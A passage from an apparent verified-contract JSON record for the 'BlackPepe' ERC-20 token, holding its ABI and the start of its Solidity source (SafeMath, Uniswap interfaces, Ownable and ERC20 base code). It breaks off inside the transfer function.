d177de4b3274cde64736f6c63430008130033",
    "contract_name": "BlackPepe",
    "compiler_version": "v0.8.19+commit.7dd6d404",
    "optimization_used": "1",
    "runs": "200",
    "abi": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"isExcluded\",\"type\":\"bool\"}],\"name\":\"ExcludeFromFees\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"SetAutomatedMarketMakerPair\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"addLiquidityWithETH\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"clearStuckEthBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"excluded\",\"type\":\"bool\"}],\"name\":\"excludeFromFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"updAds\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"isEx\",\"type\":\"bool\"}],\"name\":\"excludeFromMaxTransaction\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"finalBuyFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"finalSellFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"initialTotalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isExcludedFromFees\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTransactionAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeMaxRestrictions\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"setAutomatedMarketMakerPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnabled\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTokensAtAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingOpen\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"unclogContract\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "/**\r\n\r\n\r\n/*\r\n\r\nWebsite:    https://www.blackpepe.info/\r\n\r\nCommunity:  https://t.me/BlackPepeEthPortal\r\n\r\nTwitter:    https://twitter.com/Blackpepeerc\r\n\r\n\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity 0.8.19;\r\n\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n    unchecked {\r\n        uint256 c = a + b;\r\n        if (c < a) return (false, 0);\r\n        return (true, c);\r\n    }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n    unchecked {\r\n        if (b > a) return (false, 0);\r\n        return (true, a - b);\r\n    }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n    unchecked {\r\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n        // benefit is lost if 'b' is also tested.\r\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n        if (a == 0) return (true, 0);\r\n        uint256 c = a * b;\r\n        if (c / a != b) return (false, 0);\r\n        return (true, c);\r\n    }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n    unchecked {\r\n        if (b == 0) return (false, 0);\r\n        return (true, a / b);\r\n    }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n    unchecked {\r\n        if (b == 0) return (false, 0);\r\n        return (true, a % b);\r\n    }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * reverting when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {trySub}.\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    unchecked {\r\n        require(b <= a, errorMessage);\r\n        return a - b;\r\n    }\r\n    }\r\n\r\n    /**\r\n * @dev Returns the percentage of an unsigned integer `a` with respect to the provided percentage `b`,\r\n     * rounding towards zero. The result is a proportion of the original value.\r\n     *\r\n     * The function can be used to calculate a specific percentage of a given value `a`.\r\n     * Note: this function uses a `revert` opcode (which leaves remaining gas untouched) when\r\n     * the percentage `b` is greater than 100.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The percentage `b` must be between 0 and 100 (inclusive).\r\n     */\r\n    function per(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= 100, \"Percentage must be between 0 and 100\");\r\n        return a * b / 100;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    unchecked {\r\n        require(b > 0, errorMessage);\r\n        return a / b;\r\n    }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * reverting with custom message when dividing by zero.\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {tryMod}.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n    unchecked {\r\n        require(b > 0, errorMessage);\r\n        return a % b;\r\n    }\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint256 amountADesired,\r\n        uint256 amountBDesired,\r\n        uint256 amountAMin,\r\n        uint256 amountBMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n    external\r\n    returns (\r\n        uint256 amountA,\r\n        uint256 amountB,\r\n        uint256 liquidity\r\n    );\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n    external\r\n    payable\r\n    returns (\r\n        uint256 amountToken,\r\n        uint256 amountETH,\r\n        uint256 liquidity\r\n    );\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\ninterface IUniswapV2Pair {\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    function name() external pure returns (string memory);\r\n\r\n    function symbol() external pure returns (string memory);\r\n\r\n    function decimals() external pure returns (uint8);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address owner) external view returns (uint256);\r\n\r\n    function allowance(address owner, address spender)\r\n    external\r\n    view\r\n    returns (uint256);\r\n\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) external returns (bool);\r\n\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n\r\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n\r\n    function nonces(address owner) external view returns (uint256);\r\n\r\n    function permit(\r\n        address owner,\r\n        address spender,\r\n        uint256 value,\r\n        uint256 deadline,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s\r\n    ) external;\r\n\r\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\r\n\r\n    event Swap(\r\n        address indexed sender,\r\n        uint256 amount0In,\r\n        uint256 amount1In,\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n\r\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\r\n\r\n    function factory() external view returns (address);\r\n\r\n    function token0() external view returns (address);\r\n\r\n    function token1() external view returns (address);\r\n\r\n    function getReserves()\r\n    external\r\n    view\r\n    returns (\r\n        uint112 reserve0,\r\n        uint112 reserve1,\r\n        uint32 blockTimestampLast\r\n    );\r\n\r\n    function price0CumulativeLast() external view returns (uint256);\r\n\r\n    function price1CumulativeLast() external view returns (uint256);\r\n\r\n    function kLast() external view returns (uint256);\r\n\r\n    function mint(address to) external returns (uint256 liquidity);\r\n\r\n    function swap(\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address to,\r\n        bytes calldata data\r\n    ) external;\r\n\r\n    function skim(address to) external;\r\n\r\n    function sync() external;\r\n\r\n    function initialize(address, address) external;\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(\r\n        address indexed token0,\r\n        address indexed token1,\r\n        address pair,\r\n        uint256\r\n    );\r\n\r\n    function feeTo() external view returns (address);\r\n\r\n    function feeToSetter() external view returns (address);\r\n\r\n    function getPair(address tokenA, address tokenB)\r\n    external\r\n    view\r\n    returns (address pair);\r\n\r\n    function allPairs(uint256) external view returns (address pair);\r\n\r\n    function allPairsLength() external view returns (uint256);\r\n\r\n    function createPair(address tokenA, address tokenB)\r\n    external\r\n    returns (address pair);\r\n\r\n    function setFeeTo(address) external;\r\n\r\n    function setFeeToSetter(address) external;\r\n}\r\n\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `to`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `from` to `to` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the token.\r\n     */\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if the sender is not the owner.\r\n     */\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby disabling any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Internal function without access restriction.\r\n     */\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\nabstract contract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping(address => uint256) private _balances;\r\n\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private nameVar;\r\n    string private symbolVar;\r\n\r\n    /**\r\n     * @dev Sets the values for {name} and {symbol}.\r\n     *\r\n     * All two of these values are immutable: they can only be set once during\r\n     * construction.\r\n     */\r\n    constructor(string memory name_, string memory symbol_) {\r\n        nameVar = name_;\r\n        symbolVar = symbol_;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view virtual override returns (string memory) {\r\n        return nameVar;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return symbolVar;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-totalSupply}.\r\n     */\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `to` cannot be the zero address.\r\n     * - the caller must have a balance of at least `amount`.\r\n     */\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-approve}.\r\n     *\r\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\r\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC20}.\r\n     *\r\n     * NOTE: Does not update the allowance if the current allowance\r\n     * is the maximum `uint256`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `from` and `to` cannot be the zero address.\r\n     * - `from` must have a balance of at least `amount`.\r\n     * - the caller must have allowance for ``from``'s tokens of at least\r\n     * `amount`.\r\n     */\r\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     * - `spender` must have allowance for the caller of at least\r\n     * `subtractedValue`.\r\n     */\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Moves `amount` of tokens from `from` to `to`.\r\n     *\r\n     * This internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `from` cannot be the zero address.\r\n     * - `from` must have a balance of at least `amount`.\r\n     */\r\n    function _transfer(address from, address to, uint256 